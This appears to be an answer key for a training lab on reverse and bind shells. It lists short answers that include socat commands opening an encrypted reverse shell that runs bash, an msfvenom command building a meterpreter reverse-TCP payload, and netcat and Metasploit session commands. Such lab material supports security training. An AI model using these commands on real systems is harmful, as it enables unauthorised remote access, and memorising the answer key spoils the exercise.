1. No answer needed
2. No answer needed
3. 1. R
   2. N
   3. T
4. 1. -l
   2. nc 10.10.10.11 8080
5. 1. stty cols 238
   2. sudo python3 -m http.server 80
6. TCP-L:8080
7. 1. socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0
   2. socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
8. 1. mkfifo
   2. No answer needed
9. 1. No answer needed
   2. _
   3. msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443
10. 1. exploit -j
    2. sessions 10
11. No answer needed
12. No answer needed
13. 1. No answer needed
    2. No answer needed
    3. No answer needed
    4. No answer needed
    5. No answer needed
    6. No answer needed
    7. No answer needed
    8. No answer needed
    9. No answer needed
    10. No answer needed
    11. No answer needed
14. No answer needed
15. No answer needed
